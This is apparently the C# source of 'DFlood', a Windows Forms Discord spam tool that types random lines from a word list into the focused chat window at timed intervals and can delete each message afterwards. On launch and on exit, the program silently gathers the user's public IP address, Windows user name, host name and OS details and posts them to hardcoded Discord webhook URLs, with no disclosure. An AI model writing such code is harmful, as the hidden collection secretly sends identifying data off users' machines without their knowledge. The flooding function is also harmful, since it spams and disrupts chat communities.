//coded by wés <3
using DFlood.DFLoodDiscordRPC;
using System;
using System.Diagnostics;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;

namespace DFlood
{
    public partial class main : Form
    {
        [Obsolete]
        public main()
        {
            InitializeComponent();
            WebClient webClient = new WebClient();
        }

        private int topMostCounter, startStopCounter, messageCounter, nextWord, keyWordsCount, topTimeFloods;
        private int messageSendInterval = 1, min = 2, max = 6, floodCount = 30;
        private System.Media.SoundPlayer snd = new SoundPlayer();
        private Random rnd = new Random();
        private OpenFileDialog ofd = new OpenFileDialog();
        private OperatingSystem OS = System.Environment.OSVersion;
        private DateTime today = DateTime.Now;

        private DiscordRpc.EventHandlers handlers;
        private DiscordRpc.RichPresence presence;

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private extern static void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);

        private static void sendWebHook(string Url, string msg, string Username)
        {
            Http.Post(Url, new System.Collections.Specialized.NameValueCollection()
            {
                {
                    "username",
                    Username
                },
                {
                    "content",
                    msg
                }
            });
        }

        private void Alert(string msg, Form_Alert.enmType type)
        {
            Form_Alert frm = new Form_Alert();
            frm.showAlert(msg, type);
        }

        private void formMover_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, 0x112, 0xf012, 0);
        }

        private void DFloodDiscordRPCClient()
        {
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("852261353480650752", ref this.handlers, true, null);
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("852261353480650752", ref this.handlers, true, null);
            this.presence.details = "DFlood Discord Trainer";
            this.presence.state = "Main Menu";
            this.presence.largeImageKey = "logo";
            this.presence.smallImageKey = "logo";
            this.presence.largeImageText = "DFlood Spam Trainer";
            this.presence.smallImageText = "Suan Aktif!";
            DiscordRpc.UpdatePresence(ref this.presence);
        }/*

        public void GetPersonalUserSettings()
        {
            secureMode.Checked = Properties.Settings.Default.IsSecureMode;
            unlimitedFlood.Checked = Properties.Settings.Default.IsUnlimitedFlood;
            topMost.Checked = Properties.Settings.Default.IsTopMost;
            deleteAfter.Checked = Properties.Settings.Default.IsDeleteAfter;
            txtMessageSenderIntervalMax.Value = Properties.Settings.Default.MaxInvertal;
            txtMessageSenderIntervalMin.Value = Properties.Settings.Default.MinInterval;
            txtFloodCount.Value = Properties.Settings.Default.FloodNumber;
            messageDeleteInterval.Value = Properties.Settings.Default.msgDeleteInterval;
            topTimeFloods = Properties.Settings.Default.GetTopFloodNumber;
            min = Convert.ToInt16(txtMessageSenderIntervalMin.Value);
            max = Convert.ToInt16(txtMessageSenderIntervalMax.Value);
        }*/

        /*
                private void SavePersonalUserSettings()
                {
                    Properties.Settings.Default.IsSecureMode = secureMode.Checked;
                    Properties.Settings.Default.IsUnlimitedFlood = unlimitedFlood.Checked;
                    Properties.Settings.Default.IsTopMost = topMost.Checked;
                    Properties.Settings.Default.IsDeleteAfter = deleteAfter.Checked;
                    Properties.Settings.Default.MinInterval = Convert.ToInt16(txtMessageSenderIntervalMin.Value);
                    Properties.Settings.Default.MaxInvertal = Convert.ToInt16(txtMessageSenderIntervalMax.Value);
                    Properties.Settings.Default.msgDeleteInterval = Convert.ToInt16(messageDeleteInterval.Value);
                    Properties.Settings.Default.FloodNumber = Convert.ToInt16(txtFloodCount.Value);
                    Properties.Settings.Default.GetTopFloodNumber = topTimeFloods;
                    min = Convert.ToInt16(txtMessageSenderIntervalMin.Value);
                    max = Convert.ToInt16(txtMessageSenderIntervalMax.Value);
                    Properties.Settings.Default.Save();
                }
        */

        private void FloodService()
        {
            min = Convert.ToInt16(Properties.Settings.Default.MinimumSenderInterval);
            max = Convert.ToInt16(Properties.Settings.Default.MaximumSenderInterval);

            keyWordsCount = keywords.Items.Count;
            nextWord = rnd.Next(0, keyWordsCount);
            keywords.SelectedIndex = nextWord;

            SendKeys.Send(keywords.SelectedItem.ToString());
            SendKeys.Send("{ENTER}");

            messageCounter = messageCounter + 1;
            messageSendInterval = rnd.Next(min, max);

            topTimeFloods = topTimeFloods + 1;
        }

        private void MessageDeleteEventListener()
        {
            SendKeys.Send("{UP}");
            System.Threading.Thread.Sleep(100);
            SendKeys.Send("^(a)");
            System.Threading.Thread.Sleep(100);
            SendKeys.Send("{BACKSPACE}");
            System.Threading.Thread.Sleep(100);
            SendKeys.Send("{ENTER}");
            System.Threading.Thread.Sleep(100);
            SendKeys.Send("{ENTER}");
        }

        private void messageTimer_Tick(object sender, EventArgs e)
        {
            messageSendInterval = messageSendInterval - 1;

            if (messageSendInterval == 0)
            {
                if (Properties.Settings.Default.IsUnlimitedFloodMode == true)
                {
                    if (Properties.Settings.Default.IsDeleteAfterMode == true)
                    {
                        MessageDeleteEventListener();
                        FloodService();
                    }
                    else
                    {
                        FloodService();
                    }
                }

                if (Properties.Settings.Default.IsUnlimitedFloodMode == false)
                {
                    floodCount = floodCount + 1;
                    if (floodCount == Properties.Settings.Default.FloodCount)
                    {
                        messageTimer.Stop();
                    }

                    if (Properties.Settings.Default.IsDeleteAfterMode == true)
                    {
                        MessageDeleteEventListener();
                        FloodService();
                    }
                    else
                    {
                        FloodService();
                    }
                }
            }
        }

        private void messageDeleteTimer_Tick(object sender, EventArgs e)
        {
            MessageDeleteEventListener();
        }

        private void messageRefreshTime_MouseUp(object sender, MouseEventArgs e)
        {
            tmrVirusTotal.Stop();
        }

        private void btnExit_Click(object sender, EventArgs e)
        {
            var webClient = new WebClient();
            string dnsString = webClient.DownloadString("http://checkip.dyndns.org");
            dnsString = (new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")).Match(dnsString).Value;
            webClient.Dispose();
            var UserName = $"**Kullanıcı Adı : ** {System.Windows.Forms.SystemInformation.UserName}";
            var computerName = $"**Bilgisayar Adı : ** {Dns.GetHostName()}";
            var ipadress = $"**IP Adresi : ** {dnsString}";
            var day = $"**Giriş Günü : ** {DateTime.Now.ToLongDateString()}";
            var hour = $"**Giriş Saati : ** {DateTime.Now.ToLongTimeString()}";
            var FullOsName = $"**İşletim Sistemi : ** {(new ComputerInfo().OSFullName)}";
            var platform = $"**Platform : ** {OS.Platform.ToString()}";
            var verison = $"**Versiyon Bilgisi : ** {OS.Version.ToString()}";
            var OsVersion = $"**İşletim Sistemi Tipi : ** {OS.VersionString}";
            var CLR = $"**CLR Versiyonu : ** {System.Environment.Version}";
            sendWebHook("https://discord.com/api/webhooks/852933349000871996/bRqRbTKlp2xuDYqSpHGUFLEOzoyjH0TJKgtpB8emrhBIBD07luTGHqWd_qRcWcMVwwEc", $"**DFlood Trainer'e Yeni Çıkış Saptanması**\n{ipadress}\n{UserName}\n{computerName}\n{day}\n{hour}\n{FullOsName}\n{platform}\n{verison}\n{OsVersion}\n{CLR}\n--------------------------------------------------------------------", "DFlood Services");
            Application.Exit();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
        }

        private void ofdTimer_Tick(object sender, EventArgs e)
        {
        }

        private void btnMinimize_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        [Obsolete]
        private void main_Load(object sender, EventArgs e)
        {
            var webClient = new WebClient();
            string dnsString = webClient.DownloadString("http://checkip.dyndns.org");
            dnsString = (new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")).Match(dnsString).Value;
            webClient.Dispose();
            var UserName = $"**Kullanıcı Adı : ** {System.Windows.Forms.SystemInformation.UserName}";
            var computerName = $"**Bilgisayar Adı : ** {Dns.GetHostName()}";
            var ipadress = $"**IP Adresi : ** {dnsString}";
            var day = $"**Giriş Günü : ** {DateTime.Now.ToLongDateString()}";
            var hour = $"**Giriş Saati : ** {DateTime.Now.ToLongTimeString()}";
            var FullOsName = $"**İşletim Sistemi : ** {(new ComputerInfo().OSFullName)}";
            var platform = $"**Platform : ** {OS.Platform.ToString()}";
            var verison = $"**Versiyon Bilgisi : ** {OS.Version.ToString()}";
            var OsVersion = $"**İşletim Sistemi Tipi : ** {OS.VersionString}";
            var CLR = $"**CLR Versiyonu : ** {System.Environment.Version}";
            DFloodDiscordRPCClient();

            sendWebHook("https://discord.com/api/webhooks/852933515171201045/1P_9zIbWb7n5QnGwiNx2yLQb_qMqAEMLP2KmCYT2covhtLsu4vnhBVpK1eRKG0XnZMmX", $"**DFlood Trainer'e Yeni Giriş Saptanması**\n{ipadress}\n{UserName}\n{computerName}\n{day}\n{hour}\n{FullOsName}\n{platform}\n{verison}\n{OsVersion}\n{CLR}\n--------------------------------------------------------------------", "DFlood Services");
        }

        private void messageRefreshTime_MouseDown(object sender, MouseEventArgs e)
        {
            tmrVirusTotal.Start();
        }

        private void btnStartService_Click(object sender, EventArgs e)
        {
            startStopCounter = startStopCounter + 1;
            if (startStopCounter % 2 == 1)
            {
                messageCounter = 0;
                snd.SoundLocation = "openSound.wav";
                btnStartService.Text = "Hizmeti Durdur";
                snd.Play();
                txtFilePath.Enabled = false;
                btnImport.Enabled = false;
                messageTimer.Start();
                this.Alert("Flood Service Started", Form_Alert.enmType.Success);
            }
            else if (startStopCounter % 2 == 0)
            {
                snd.SoundLocation = "success.wav";
                btnStartService.Text = "Hizmeti Başlat";
                snd.Play();
                this.Alert("Flood Service Stopped", Form_Alert.enmType.Warning);
                messageCounter = 0;
                startStopCounter = 0;
                messageTimer.Stop();
            }
        }

        private void btnImport_Click(object sender, EventArgs e)
        {
            ofd.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
            ofd.FilterIndex = 1;
            ofd.InitialDirectory = "c:\\";
            ofd.RestoreDirectory = true;

            snd.SoundLocation = "openSound.wav";
            snd.Play();
            DialogResult reply = ofd.ShowDialog();
            if (reply == DialogResult.OK)
            {
                keywords.Items.Clear();
                StreamReader oku = new StreamReader(ofd.FileName);
                string satir = oku.ReadLine();
                while (satir != null)
                {
                    keywords.Items.Add(satir);
                    satir = oku.ReadLine();
                }
                snd.SoundLocation = "success.wav";
                snd.Play();
                btnStartService.Enabled = true;
                this.Alert($"Import Successfully", Form_Alert.enmType.Success);

                txtFilePath.Text = ofd.FileName;
            }
            else if (reply == DialogResult.Cancel)
            {
                txtFilePath.Enabled = false;
                btnStartService.Enabled = false;
            }
        }

  

        private void txtFilePath_TextChanged(object sender, EventArgs e)
        {
            if (txtFilePath.TextLength == 0)
                btnStartService.Enabled = false;
            else
                btnStartService.Enabled = true;
        }
    }
}